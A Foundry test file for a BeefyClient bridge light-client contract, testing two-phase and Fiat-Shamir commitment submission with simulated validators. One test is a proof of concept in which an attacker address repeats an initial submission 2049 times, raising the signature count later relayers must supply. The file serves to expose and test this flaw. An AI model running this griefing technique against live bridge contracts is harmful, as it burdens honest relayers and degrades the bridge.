pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {BeefyClient} from "../src/BeefyClient.sol";
import {BeefyClientMock} from "./mocks/BeefyClientMock.sol";
import {Bitfield} from "../src/utils/Bitfield.sol";
import {ScaleCodec} from "../src/utils/ScaleCodec.sol";
import {SubstrateMerkleProof} from "../src/utils/SubstrateMerkleProof.sol";
import {Math} from "../src/utils/Math.sol";

contract BeefyClientAdvancedTest is Test {
    using stdJson for string;

    BeefyClientMock beefyClient;
    uint256 constant VSET_LEN = 600;
    uint64 constant VSET_ID = 1;
    uint256 constant RANDAO_DELAY = 128;
    uint256 constant RANDAO_EXPIRY = 24;
    uint256 constant MIN_REQ_SIGS = 17; // keep N small to show N < quorum
    uint256 constant FIAT_SHAMIR_REQUIRED_SIGNATURES = 101;

    uint256[VSET_LEN] privkeys;
    address[VSET_LEN] validators;
    bytes32 vsetRoot;
    bytes32[] vLeaves;
    bytes32[][] vProofs;
    address validator0;
    uint256 validator0PK;
    bytes32[] proofIndex0;

    bytes2 constant MMR_ROOT_ID = bytes2("mh");
    bytes32 constant MMRRoot =
        bytes32(uint256(0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF));

    address honestRelayer1 = address(0xBEEF);
    address honestRelayer2 = address(0xCAFE);
    address attacker = address(0xA11CE);

    function setUp() public {
        vLeaves = new bytes32[](VSET_LEN);
        for (uint256 i = 0; i < VSET_LEN; i++) {
            privkeys[i] = uint256(keccak256(abi.encodePacked("v", i)));
            validators[i] = vm.addr(privkeys[i]);
            vLeaves[i] = keccak256(abi.encodePacked(validators[i]));
            if (i == 0) {
                validator0 = validators[i];
                validator0PK = privkeys[i];
            }
        }

        // substrate-compatible merkle root & per-leaf proofs
        (vsetRoot, vProofs) = _buildSubstrateBinaryMerkle(vLeaves);
        proofIndex0 = vProofs[0];

        BeefyClient.ValidatorSet memory cur =
            BeefyClient.ValidatorSet({id: VSET_ID, length: uint128(VSET_LEN), root: vsetRoot});
        BeefyClient.ValidatorSet memory nxt =
            BeefyClient.ValidatorSet({id: VSET_ID + 1, length: uint128(VSET_LEN), root: vsetRoot});

        beefyClient = new BeefyClientMock({
            _randaoCommitDelay: RANDAO_DELAY,
            _randaoCommitExpiration: RANDAO_EXPIRY,
            _minNumRequiredSignatures: MIN_REQ_SIGS,
            _fiatShamirRequiredSignatures: FIAT_SHAMIR_REQUIRED_SIGNATURES,
            _initialBeefyBlock: 0,
            _initialValidatorSet: cur,
            _nextValidatorSet: nxt
        });
    }

    function testSignatureUsageInflation() external {
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i); // claim 0..quorum-1 signed
        }
        // === real validator proof for index 0 with a real signature ===
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator0PK, commitmentHash);
        BeefyClient.ValidatorProof memory vproof = BeefyClient.ValidatorProof({
            v: v, r: r, s: s, index: 0, account: validator0, proof: proofIndex0
        });

        vm.startPrank(honestRelayer1);
        beefyClient.submitInitial(commitment, bitfield, vproof);
        bytes32 ticketID1 = beefyClient.createTicketID_public(honestRelayer1, commitmentHash);
        (
            ,, /*blockNumber1*/ /*vsetLen1*/
            uint32 nRequiredBefore,, /*prevRandao1*/ /*bitfieldHash1*/
        ) = beefyClient.tickets(ticketID1);
        vm.stopPrank();

        vm.startPrank(attacker);
        uint256 spam = 2049; // ceilLog2(2049) = 12  => ΔN = 2*12 = +24
        for (uint256 i = 0; i < spam; i++) {
            beefyClient.submitInitial(commitment, bitfield, vproof);
        }
        vm.stopPrank();
        // -------------------------
        // impact: new relayer now gets 24+ extra sigs required
        // -------------------------
        vm.startPrank(honestRelayer2);
        beefyClient.submitInitial(commitment, bitfield, vproof);
        bytes32 ticketID2 = beefyClient.createTicketID_public(honestRelayer2, commitmentHash);
        (,, /*blockNumber2*/ /*vsetLen2*/ uint32 nRequiredAfter,/*prevRandao2*/ /*bfhash2*/,) =
            beefyClient.tickets(ticketID2);
        vm.stopPrank();
        // assert protocol-wide grief: ΔN >= 24 and never exceeds quorum
        assertGt(nRequiredAfter, nRequiredBefore, "N did not increase");
        assertLe(nRequiredAfter, uint32(quorum), "N must be capped at quorum");
        assertTrue(
            nRequiredAfter >= nRequiredBefore + 24, unicode"Need ΔN >= 24 for high-impact demo"
        );
        // logs
        emit log_named_uint("Baseline N (before attack)", nRequiredBefore);
        emit log_named_uint("N after attack", nRequiredAfter);
        emit log_named_uint(unicode"ΔN", nRequiredAfter - nRequiredBefore);
        emit log_named_uint("Quorum cap", quorum);
    }

    function testTwoPhaseCommitWithRequiredSignatures() public {
        console.log("Submit initial commitment");
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i); // claim 0..quorum-1 signed
        }
        // === real validator proof for index 0 with a real signature ===
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator0PK, commitmentHash);
        BeefyClient.ValidatorProof memory vproof = BeefyClient.ValidatorProof({
            v: v, r: r, s: s, index: 0, account: validator0, proof: proofIndex0
        });

        vm.startPrank(honestRelayer1);
        beefyClient.submitInitial(commitment, bitfield, vproof);

        console.log("commit PREVRANDAO after the required delay");
        vm.roll(block.number + RANDAO_DELAY);
        // set a deterministic PREVRANDAO
        bytes32 PREVRANDAO = bytes32(
            uint256(
                2_954_466_101_346_023_252_933_346_884_990_731_083_400_112_195_551_952_331_583_346_342_070_284_928_184
            )
        );
        vm.prevrandao(PREVRANDAO);
        beefyClient.commitPrevRandao(commitmentHash);

        // MMR leaf/proof params are ignored when validatorSetID == current set; we pass dummies
        BeefyClient.MMRLeaf memory dummyLeaf2;

        console.log("submit final proof with insufficient signatures");
        BeefyClient.ValidatorProof[] memory finalProofs =
            _generateFinalProofs(commitmentHash, bitfield, MIN_REQ_SIGS - 1);
        vm.expectRevert(BeefyClient.InvalidValidatorProofLength.selector);
        beefyClient.submitFinal(commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0);

        console.log("submit final proof with wrong signatures");
        finalProofs = _generateFinalProofs(commitmentHash, bitfield, MIN_REQ_SIGS);
        finalProofs[0].account = address(0x1234); // invalidate one proof
        vm.expectRevert(BeefyClient.InvalidValidatorProof.selector);
        beefyClient.submitFinal(commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0);

        console.log("submit final proof with sufficient signatures");
        finalProofs = _generateFinalProofs(commitmentHash, bitfield, MIN_REQ_SIGS);
        beefyClient.submitFinal(commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0);
        assertEq(beefyClient.latestMMRRoot(), MMRRoot, "MMR root updated");
    }

    function testFiatShamirCommitWithRequiredSignatures() public {
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum =
            Math.min(FIAT_SHAMIR_REQUIRED_SIGNATURES, beefyClient.computeQuorum_public(VSET_LEN));
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i); // claim 0..quorum-1 signed
        }

        // MMR leaf/proof params are ignored when validatorSetID == current set; we pass dummies
        BeefyClient.MMRLeaf memory dummyLeaf2;

        console.log("submit proof with insufficient signatures");
        BeefyClient.ValidatorProof[] memory finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, FIAT_SHAMIR_REQUIRED_SIGNATURES - 1
        );
        vm.expectRevert(BeefyClient.InvalidValidatorProofLength.selector);
        beefyClient.submitFiatShamir(
            commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0
        );

        console.log("submit proof with wrong signatures");
        finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, FIAT_SHAMIR_REQUIRED_SIGNATURES
        );
        finalProofs[0].account = address(0x1234); // invalidate one proof
        vm.expectRevert(BeefyClient.InvalidValidatorProof.selector);
        beefyClient.submitFiatShamir(
            commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0
        );

        console.log("submit final proof with sufficient signatures");
        finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, FIAT_SHAMIR_REQUIRED_SIGNATURES
        );
        beefyClient.submitFiatShamir(
            commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0
        );
        assertEq(beefyClient.latestMMRRoot(), MMRRoot, "MMR root updated");
    }

    // ---------------------- Helpers ----------------------

    function _buildCommitment(uint32 blockNumber, uint64 validatorSetID, bytes32 mmrRoot)
        internal
        view
        returns (BeefyClient.Commitment memory commitment, bytes32 commitmentHash)
    {
        BeefyClient.PayloadItem[] memory payload = new BeefyClient.PayloadItem[](1);
        payload[0] = BeefyClient.PayloadItem({payloadID: MMR_ROOT_ID, data: bytes.concat(mmrRoot)});
        commitment = BeefyClient.Commitment({
            blockNumber: blockNumber, validatorSetID: validatorSetID, payload: payload
        });
        commitmentHash = keccak256(beefyClient.encodeCommitment_public(commitment));
    }

    // a Substrate-style binary merkle tree (duplicate last node when width is odd),
    // and produce per-leaf proofs compatible with SubstrateMerkleProof.verify()
    function _buildSubstrateBinaryMerkle(bytes32[] memory leaves)
        internal
        pure
        returns (bytes32 root, bytes32[][] memory outProofs)
    {
        uint256 n = leaves.length;
        require(n > 0, "no leaves");

        // number of levels (excluding leaf level)
        uint256 levels = 0;
        for (uint256 w = n; w > 1; w = (w + 1) >> 1) {
            levels++;
        }

        outProofs = new bytes32[][](n);
        for (uint256 i = 0; i < n; i++) {
            outProofs[i] = new bytes32[](levels);
        }

        // for each leaf independently, compute its proof by walking up levels
        for (uint256 leafIdx = 0; leafIdx < n; leafIdx++) {
            uint256 pos = leafIdx;
            uint256 width = n;
            bytes32[] memory layer = new bytes32[](width);
            for (uint256 i = 0; i < width; i++) {
                layer[i] = leaves[i];
            }

            uint256 step = 0;
            while (width > 1) {
                // proof sibling at this level
                bytes32 sibling;
                if (pos & 1 == 1) {
                    // right child -> sibling is left (pos-1)
                    sibling = layer[pos - 1];
                } else if (pos + 1 == width) {
                    // last element with no right sibling -> duplicate self
                    sibling = layer[pos];
                } else {
                    // left child with right sibling
                    sibling = layer[pos + 1];
                }
                outProofs[leafIdx][step] = sibling;

                // next layer with duplication of last when odd
                uint256 nextW = (width + 1) >> 1;
                bytes32[] memory nextLayer = new bytes32[](nextW);
                for (uint256 i = 0; i < width; i += 2) {
                    bytes32 left = layer[i];
                    bytes32 right = (i + 1 < width) ? layer[i + 1] : layer[i];
                    nextLayer[i >> 1] = keccak256(abi.encodePacked(left, right));
                }

                // move up one level
                pos >>= 1;
                width = nextW;
                layer = nextLayer;
                step++;
            }

            if (leafIdx == 0) {
                root = layer[0];
            }
        }
    }

    function _generateFinalProofs(
        bytes32 commitmentHash,
        uint256[] memory bitfield,
        uint256 minimRequireSigs
    ) internal view returns (BeefyClient.ValidatorProof[] memory) {
        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256 quorum2 =
            beefyClient.computeNumRequiredSignatures_public(VSET_LEN, 0, minimRequireSigs);
        uint256[] memory finalBitfield = beefyClient.createFinalBitfield(commitmentHash, bitfield);
        BeefyClient.ValidatorProof[] memory finalProofs = new BeefyClient.ValidatorProof[](quorum2);
        uint256 j = 0;
        for (uint256 i = 0; i < quorum; i++) {
            if (Bitfield.isSet(finalBitfield, i)) {
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(privkeys[i], commitmentHash);
                finalProofs[j] = BeefyClient.ValidatorProof({
                    v: v,
                    r: r,
                    s: s,
                    index: i,
                    account: validators[i],
                    proof: vProofs[i] // merkle path to vsetRoot
                });
                j++;
                if (j == quorum2) {
                    break;
                }
            }
        }
        return finalProofs;
    }

    function _generateFiatShamirProofs(
        BeefyClient.Commitment memory commitment,
        bytes32 commitmentHash,
        uint256[] memory bitfield,
        uint256 minimRequireSigs
    ) internal view returns (BeefyClient.ValidatorProof[] memory) {
        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);

        uint256 quorum2 = Math.min(minimRequireSigs, quorum);

        uint256[] memory finalBitfield =
            beefyClient.createFiatShamirFinalBitfield(commitment, bitfield);
        BeefyClient.ValidatorProof[] memory finalProofs = new BeefyClient.ValidatorProof[](quorum2);
        uint256 j = 0;
        for (uint256 i = 0; i < quorum; i++) {
            if (Bitfield.isSet(finalBitfield, i)) {
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(privkeys[i], commitmentHash);
                finalProofs[j] = BeefyClient.ValidatorProof({
                    v: v,
                    r: r,
                    s: s,
                    index: i,
                    account: validators[i],
                    proof: vProofs[i] // merkle path to vsetRoot
                });
                j++;
                if (j == quorum2) {
                    break;
                }
            }
        }
        return finalProofs;
    }
}
